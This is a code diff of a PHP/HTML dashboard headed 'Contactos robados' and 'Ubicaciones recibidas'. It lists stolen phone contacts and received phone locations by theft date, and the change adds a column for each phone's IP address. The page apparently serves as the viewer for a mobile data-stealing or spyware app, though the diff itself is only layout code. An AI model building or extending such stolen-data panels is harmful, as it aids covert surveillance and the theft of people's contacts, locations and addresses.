@@ -18,11 +18,11 @@ $locations_repo = LocationsRepository::getInstance();
     <script src="js/bootstrap.min.js"></script>
   </head>
 <body>  
-  <div class="container">
-    <div class="panel panel-primary col-md-6">
+  <div class="container" style="width:100%">
+    <div class="panel panel-primary col-md-5">
       <!-- Default panel contents -->
       <div class="panel-heading"><h1>Contactos robados</h1></div>
-      <div class="panel-body">
+      <div class="panel-body" style="overflow: scroll; height: 80%;">
         <?php foreach($contacts_repo->getPhoneBooks() as $phone_book): ?>
         <div class="row" style="border-top:solid "> 
           <div class="col-md-3"><b>Fecha de robo</b><br><?php echo $phone_book->getRetrievedDate()->format('Y-m-d H:i:s'); ?></div>
@@ -46,17 +46,18 @@ $locations_repo = LocationsRepository::getInstance();
         <?php endforeach; ?>
       </div>
     </div>  
-    <div class="panel panel-primary col-md-6">
+    <div class="panel panel-primary col-md-7">
       <!-- Default panel contents -->
       <div class="panel-heading"><h1>Ubicaciones recibidas</h1></div>
-      <div class="panel-body">
+      <div class="panel-body" style="overflow: scroll; height: 80%;">
          <div class="row">
           <table class="table table-condensed table-bordered"> 
-            <thead><tr><th>Retrieved Data</th><th>Ubicacion</th></tr></thead>
+            <thead><tr><th>Fecha de robo</th><th>IP del celular</th><th>Ubicacion</th></tr></thead>
             <tbody>
               <?php foreach($locations_repo->getLocations() as $location): ?>
                 <tr>
                   <td><?php echo $location->getRetrievedDate()->format('Y-m-d H:i:s'); ?></td>
+                  <td><?php echo $location->getRemoteAddr(); ?></td>
                   <td><?php echo $location->getLocation(); ?></td>
                 </tr>
               <?php endforeach; ?>
